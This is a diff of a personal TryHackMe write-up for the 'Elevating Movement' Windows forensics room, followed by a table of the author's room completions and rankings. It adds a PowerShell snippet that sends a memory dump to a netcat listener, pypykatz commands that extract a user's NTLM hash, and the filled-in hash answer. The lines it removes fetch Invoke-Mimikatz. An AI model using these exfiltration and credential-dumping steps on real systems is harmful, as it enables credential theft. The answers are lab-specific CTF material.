@@ -1,5 +1,6 @@
 <h1 align="center">Elevating Movement</h1>
-<p align="center">2025, November 8  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>1</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Investigate the second, Windows part of the Honeynet Collapse! &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/elevatingmovement">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/7c99579b-0a08-4e18-9045-80dad21d2287"></p>
+<p align="center">2025, November 8 - December 30 &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a> Let´s in investigate the second, Windows part of the Honeynet Collapse from <a href="https://tryhackme.com"> TryHackMe</a>. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/elevatingmovement">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/4f91cfbe-466a-4e4b-8290-cd0b87a03617"></p>
+
 
 <h2>Task 1 . Introduction</h2>
 <h3>Meet DeceptiTech</h3>
@@ -157,48 +158,136 @@ C:\Users\Administrator\Desktop\PECmd.exe C:\Windows\Prefetch --csv ..\Prefetch -
 
 <br>
 <p>2.6. What is the NTLM hash of matthew.collins' domain password?<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>____</code></p>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>eb3d2de2f21b31933fb4a4fd7a7d314d</code></p>
 
-
-```bash
-:~/ElevatingMovement# curl -OL https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
-```
-
-<img width="1227" height="165" alt="image" src="https://github.com/user-attachments/assets/be01a080-8590-45e0-a023-4c841cf17b90" />
+<img width="1155" height="557" alt="image" src="https://github.com/user-attachments/assets/6af58666-281e-4efe-911d-5915788efa3d" />
 
 <br>
 <br>
+<p>
+
+- Install or Locate Pypykatz.<br>To analyze the memory dump, use <strong>pypykatz</strong>.<br>If it is not already in your PATH, you can install it via pip:</p>
 
 ```bash
-:~/ElevatingMovement# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+pip3 install pypykatz
 ```
 
+<p>Note: On the TryHackMe AttackBox, you may need to run it using the full path: <code>~/.local/bin/pypykatz</code>.</p>
+<br>
 
 ```bash
-10.82.123.166
+:~/ElevatingMovement# nc -nvlp 4444 > text.txt.dmp
+Listening on 0.0.0.0 4444
 ```
+
+<br>
 
 ```bash
-C:\>mkdir tmp
+PS C:\Users\Administrator> $file = "C:\Windows\system32\text.txt.dmp"
+PS C:\Users\Administrator> $ip = "10.65.64.164"
+PS C:\Users\Administrator> $port = 4444
+PS C:\Users\Administrator> $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
+PS C:\Users\Administrator> $stream = $client.GetStream()
+PS C:\Users\Administrator> $bytes = [System.IO.File]::ReadAllBytes($file)
+PS C:\Users\Administrator> $stream.Write($bytes, 0, $bytes.Length)
+PS C:\Users\Administrator> $stream.Close()
+PS C:\Users\Administrator> $client.Close()
+PS C:\Users\Administrator>
 ```
+
+<img width="1299" height="341" alt="image" src="https://github.com/user-attachments/assets/87f3fd06-f05a-44a3-ab87-6f7292c2664f" />
+
+<br>
+<br>
+<br>
 
 ```bash
-C:\>cd tmp
+:~/ElevatingMovement# nc -nvlp 4444 > text.txt.dmp
+Listening on 0.0.0.0 4444
+Connection received on 10.65.165.167 50336
 ```
+
+<img width="1333" height="101" alt="image" src="https://github.com/user-attachments/assets/d0de2900-3f18-4c69-93f8-641f408ee1f8" />
+
+<br>
+<br>
+<br>
 
 ```bash
-C:\tmp>curl http://xx.xx.xxx.xxx:8000/Invoke-Mimikatz.exe -o Invoke-Mimikatz.exe
+:~/ElevatingMovement# ls
+text.txt.dmp
 ```
+
+<img width="1335" height="81" alt="image" src="https://github.com/user-attachments/assets/d47b778b-4998-4ee8-bd99-da146abe9cd6" />
+
+<br>
+<br>
+<br>
 
 ```bash
-C:\tmp>ls
+:~/ElevatingMovement# pypykatz lsa minidump text.txt.dmp --grep | grep -iE matthew.collins
+INFO:pypykatz:Parsing file text.txt.dmp
+text.txt.dmp:msv:DECEPT:matthew.collins:eb3d2de2f21b31933fb4a4fd7a7d314d::435e619bc84181f42fd4c01f517878a4efd5fd32::::
+text.txt.dmp:msv:DECEPT:matthew.collins:eb3d2de2f21b31933fb4a4fd7a7d314d::435e619bc84181f42fd4c01f517878a4efd5fd32::::
 ```
 
-```bash
-C:\tmp>ls
-```
+<img width="1878" height="117" alt="image" src="https://github.com/user-attachments/assets/c94fde93-a785-425e-896c-4409bcc74d8c" />
 
 
+<br>
+<br>
+<br>
+<h1 align="center">Completed</h1>
 
-<img width="1189" height="202" alt="image" src="https://github.com/user-attachments/assets/91e47436-a8e5-448b-a5da-35627a8424e2" />
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6e020295-3f9f-4c14-8062-bf5e540539f5"><br><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/7d88035a-4118-45c7-b9e3-660ad415e8e4"></p>
+
+
+<h1 align="center">My TryHackMe Journey ・ 2025, December</h1>
+
+<div align="center"><h6>
+
+| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
+|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
+|30      |Hard 🚩 - Elevating Movement                    |14 |     102ⁿᵈ  |     3ʳᵈ    |    4,517ᵗʰ   |       56ᵗʰ     |    135,558  |    1,055    |    84     |
+|30      |Medium 🚩 - Binary Heaven                       |14 |     103ʳᵈ  |     3ʳᵈ    |    4,604ᵗʰ   |       56ᵗʰ     |    135,528  |    1,054    |    84     |
+|27      |Medium 🚩 - Metamorphosis                       |11 |     101ˢᵗ  |     3ʳᵈ    |    4,966ᵗʰ   |       58ᵗʰ     |    135,348  |    1,053    |    84     |
+|26      |Hard 🚩 - The Great Disappearing Act            |10 |     101ˢᵗ  |     3ʳᵈ    |    5,091ˢᵗ   |       62ⁿᵈ     |    135,288  |    1,052    |    84     |
+|25      |Medium 🚩 - Profiles                             |9 |     100ᵗʰ  |     3ʳᵈ    |   13,969ᵗʰ   |      156ᵗʰ     |    135,198  |    1,051    |    84     |
+|24      |Medium 🔗 - YARA Rules - YARA mean one!          |8 |     100ᵗʰ  |     3ʳᵈ    |   10,263ʳᵈ   |      127ᵗʰ     |    135,168  |    1,050    |    84     |
+|24      |Easy 🔗 - Exploitation with cURL - Hoperation Eggsploit|8 |100ᵗʰ |     3ʳᵈ    |   12,804ᵗʰ   |      154ᵗʰ     |    135,144  |    1,049    |    84     |
+|24      |Medium 🔗 - Phishing - Phismas Greetings         |8 |     100ᵗʰ  |     3ʳᵈ    |   14,507ᵗʰ   |      174ᵗʰ     |    135,112  |    1,048    |    84     |
+|24      |Easy 🔗 - n8n: CVE-2025-68613                    |8 |     102ⁿᵈ  |     3ʳᵈ    |   18,279ᵗʰ   |      205ᵗʰ     |    135,064  |    1,047    |    84     |
+|24      |Medium 🔗 - C2 Detection - Command & Carol       |8 |     101ˢᵗ  |     3ʳᵈ    |   17,260ᵗʰ   |      193ʳᵈ     |    135,048  |    1,046    |    84     |
+|23      |Easy 🔗 - AWS Security - S3cret Santa            |7 |      99ᵗʰ  |     3ʳᵈ    |   16,068ᵗʰ   |      182ⁿᵈ     |    135,008  |    1,045    |    84     |
+|23      |Easy 🔗 - Malware Analysis - Malhare.exe         |7 |      99ᵗʰ  |     3ʳᵈ    |   17,332ⁿᵈ   |      191ˢᵗ     |    134,968  |    1,044    |    84     |
+|20      |Medium 🔗 - Containers - DoorDasher's Demise     |4 |     100ᵗʰ  |     3ʳᵈ    |   18,059ᵗʰ   |      206ᵗʰ     |    134,864  |    1,043    |    84     |
+|20      |Medium 🔗 - Forensics - Registry Furensics       |4 |     100ᵗʰ  |     3ʳᵈ    |   20,497ᵗʰ   |      239ᵗʰ     |    134,832  |    1,042    |    84     |
+|20      |Medium 🔗 - Web Attack Forensics - Drone Alone   |4 |     100ᵗʰ  |     3ʳᵈ    |   21,935ᵗʰ   |      243ʳᵈ     |    134,808  |    1,041    |    84     |
+|20      |Easy 🔗 - XSS - Merry XSSMas                     |4 |     100ᵗʰ  |     3ʳᵈ    |   23,069ᵗʰ   |      256ᵗʰ     |    134,792  |    1,040    |    84     |
+|20      |Easy 🔗 -  Race Conditions - Toy to The World    |4 |     100ᵗʰ  |     3ʳᵈ    |   24,717ᵗʰ   |      275ᵗʰ     |    134,768  |    1,039    |    84     |
+|20      |Medium 🔗 -  SOC Alert Triaging - Tinsel Triage  |4 |     100ᵗʰ  |     3ʳᵈ    |   25,202ⁿᵈ   |      286ᵗʰ     |    134,752  |    1,038    |    84     |
+|19      |Medium 🔗 -  ICS/Modbus - Claus for Concern      |3 |     101ˢᵗ  |     3ʳᵈ    |   28,869ᵗʰ   |      337ᵗʰ     |    134,658  |    1,037    |    84     |
+|19      |Easy 🔗 -  Passwords - A Cracking Christmas      |3 |     101ˢᵗ  |     3ʳᵈ    |   29,583ʳᵈ   |      340ᵗʰ     |    134,642  |    1,036    |    84     |
+|18      |Easy 🔗 -  Prompt Injection - Sched-yule conflict|2 |     101ˢᵗ  |     3ʳᵈ    |   30,518ᵗʰ   |      353ʳᵈ     |    134,626  |    1,035    |    84     |
+|18      |Medium 🔗 -  Obfuscation - The Egg Shell File    |2 |     101ˢᵗ  |     3ʳᵈ    |   30,967ᵗʰ   |      358ᵗʰ     |    134,618  |    1,034    |    84     |
+|17      |Medium 🔗 - CyberChef - Hoperation Save McSkidy  |1 |     101ˢᵗ  |     3ʳᵈ    |   32,378ᵗʰ   |      374ᵗʰ     |    134,602  |    1,033    |    84     |
+|7       |Medium 🔗 - Malware Analysis - Egg-xecutable     |2 |      95ᵗʰ  |     3ʳᵈ    |   11,604ᵗʰ   |      145ᵗʰ     |    134,544  |    1,034    |    84     |
+|7       |Easy 🔗 - Network Discovery - Scan-ta Clause     |2 |      95ᵗʰ  |     3ʳᵈ    |   18,575ᵗʰ   |      208ᵗʰ     |    134,522  |    1,033    |    84     |
+|7       |Easy 🔗 - React2Shell: CVE-2025-55182            |2 |      95ᵗʰ  |     3ʳᵈ    |   28,593ʳᵈ   |      326ᵗʰ     |    134,474  |    1,032    |    81     |
+|6       |Medium 🔗 - IDOR - Santa´s Little IDOR           |1 |      95ᵗʰ  |     3ʳᵈ    |   27,309ᵗʰ   |      328ᵗʰ     |    134,450  |    1,031    |    81     |
+|6       |Easy 🔗 - AI in Security - old sAInt nick        |1 |      95ᵗʰ  |     3ʳᵈ    |   41,626ᵗʰ   |      526ᵗʰ     |    134,426  |    1,030    |    81     |
+|6       |Medium 🔗 - Splunk Basics - Did you SIEM?        |1 |      95ᵗʰ  |     3ʳᵈ    |   44,647ᵗʰ   |      560ᵗʰ     |    134,410  |    1,029    |    81     |
+|6       |Easy 🔗 - Phishing - Merry Clickmas              |1 |      96ᵗʰ  |     3ʳᵈ    |   55,824ᵗʰ   |      674ᵗʰ     |    134,370  |    1,028    |    81     |
+|6       |Easy 🔗 - Linux CLI - Shells Bells               |1 |      97ᵗʰ  |     3ʳᵈ    |   53,003ʳᵈ   |      712ⁿᵈ     |    134,354  |    1,027    |    81     |
+
+</h6></div><br>
+
+<p align="center">Global All Time:    102ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/8b27a078-c83c-423a-9234-d9b3e34edd8e"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/702993ee-0d1b-42ac-94b5-41111022b663"><br><br>
+                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/32471dd2-11c9-4ee5-a12d-ae7125a0ae4e"><br><br>
+                  Global monthly:   4,517ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/bc526c60-38b6-41eb-88a8-abd189bccc39"><br><br>
+                  Brazil monthly:      56ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/21ce51df-8402-4b22-b04e-1c2ef25f0c5d"></p>
+
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
